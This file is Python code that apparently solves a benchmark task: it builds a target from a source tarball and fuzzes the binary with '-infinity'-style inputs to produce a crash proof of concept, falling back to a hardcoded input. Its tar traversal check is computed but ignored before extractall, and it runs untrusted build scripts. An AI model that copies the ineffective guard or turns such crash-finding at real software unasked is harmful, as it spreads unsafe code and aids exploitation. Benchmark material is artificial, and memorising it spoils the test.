import os
import tarfile
import tempfile
import subprocess
import stat
import random
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = None
        try:
            root_dir = tempfile.mkdtemp(prefix="pocgen_")
            if not self._extract_tarball(src_path, root_dir):
                return self._fallback_poc()
            build_sh = self._find_build_sh(root_dir)
            if build_sh is not None:
                binary = self._build_and_find_binary(build_sh, root_dir)
                if binary is not None:
                    poc = self._fuzz_for_crash(binary)
                    if poc is not None:
                        return poc
        finally:
            if root_dir is not None and os.path.isdir(root_dir):
                shutil.rmtree(root_dir, ignore_errors=True)
        return self._fallback_poc()

    def _fallback_poc(self) -> bytes:
        # 16-byte input with leading '-' and "infinity" to match bug description
        return b"-infinity1234567"

    def _extract_tarball(self, src_path: str, dst_dir: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory

                for member in tf.getmembers():
                    member_path = os.path.join(dst_dir, member.name)
                    if not is_within_directory(dst_dir, member_path):
                        continue
                tf.extractall(dst_dir)
            return True
        except Exception:
            return False

    def _find_build_sh(self, root_dir: str):
        for dirpath, dirnames, filenames in os.walk(root_dir):
            if "build.sh" in filenames:
                return os.path.join(dirpath, "build.sh")
        return None

    def _build_and_find_binary(self, build_sh: str, root_dir: str):
        cwd = os.path.dirname(build_sh)
        try:
            st = os.stat(build_sh)
            os.chmod(build_sh, st.st_mode | stat.S_IXUSR)
        except OSError:
            pass

        shell_exe = "bash"
        if shutil.which(shell_exe) is None:
            shell_exe = "sh"

        try:
            subprocess.run(
                [shell_exe, build_sh],
                cwd=cwd,
                env=os.environ.copy(),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60.0,
                check=False,
            )
        except Exception:
            return None

        candidates = []
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for name in filenames:
                path = os.path.join(dirpath, name)
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                if not (st.st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)):
                    continue
                lower_name = name.lower()
                if lower_name.endswith((".sh", ".bash", ".py", ".pl", ".rb", ".js", ".php", ".lua")):
                    continue
                if lower_name.endswith((".so", ".a", ".o", ".lo", ".la", ".dll")):
                    continue
                candidates.append((path, st))

        if not candidates:
            return None

        def rank(item):
            path, st = item
            name = os.path.basename(path).lower()
            score = 0
            if "fuzz" in name:
                score += 4
            if "poc" in name:
                score += 3
            if "test" in name or "target" in name:
                score += 2
            if "example" in name or "demo" in name or "main" in name:
                score += 1
            return (score, st.st_size)

        candidates.sort(key=rank, reverse=True)
        return candidates[0][0]

    def _fuzz_for_crash(self, binary_path: str):
        max_tests = 250
        timeout = 0.08
        tested = 0
        visited = set()

        def run_one(data: bytes) -> bool:
            nonlocal tested
            if data in visited:
                return False
            if tested >= max_tests:
                return False
            visited.add(data)
            tested += 1
            try:
                proc = subprocess.run(
                    [binary_path],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=timeout,
                )
            except subprocess.TimeoutExpired:
                return False
            rc = proc.returncode
            if rc < 0:
                return True
            return False

        bases = [
            b"-inf",
            b"-infi",
            b"-infin",
            b"-infinity",
            b"-Infinity",
            b"-INF",
            b"-INFINITY",
            b"-nan",
            b"-NaN",
            b"-1e309",
            b"-1e1000",
            b"-0",
            b"-1",
            b"-x",
            b"-a",
            b"-z",
            b"-i",
            b"-ii",
            b"-iiiiiiii",
        ]
        tails = [b"", b"\n", b"0", b"1", b"f", b"n", b" "]
        pad_chars = [b"A", b"0", b"f", b"n"]
        target_lengths = [4, 8, 16, 24, 32, 48, 64]

        for base in bases:
            for tail in tails:
                s = base + tail
                if 1 <= len(s) <= 64:
                    if run_one(s):
                        return s
                for pad in pad_chars:
                    for tlen in target_lengths:
                        if len(s) < tlen:
                            s2 = s + pad * (tlen - len(s))
                            if run_one(s2):
                                return s2

        explicit_seeds = [
            b"-infinity1234567",
            b"-Infinity1234567",
            b"-inf1234567890123",
        ]
        for s in explicit_seeds:
            if run_one(s):
                return s

        if tested >= max_tests:
            return None

        remaining = max_tests - tested
        alphabet = b"infINFaety0123456789+-.eE \n"
        random.seed(0)

        for _ in range(remaining):
            length = random.randint(1, 64)
            if length <= 0:
                continue
            if length == 1:
                s = b"-"
            else:
                rest_len = length - 1
                if random.random() < 0.7:
                    base = random.choice([b"inf", b"INF", b"infinity", b"Infinity"])
                    if rest_len <= len(base):
                        s = b"-" + base[:rest_len]
                    else:
                        prefix_len = random.randint(0, rest_len - len(base))
                        suffix_len = rest_len - len(base) - prefix_len
                        prefix = bytes(random.choice(alphabet) for _ in range(prefix_len))
                        suffix = bytes(random.choice(alphabet) for _ in range(suffix_len))
                        s = b"-" + prefix + base + suffix
                else:
                    rest = bytes(random.choice(alphabet) for _ in range(rest_len))
                    s = b"-" + rest
            if run_one(s):
                return s

        return None
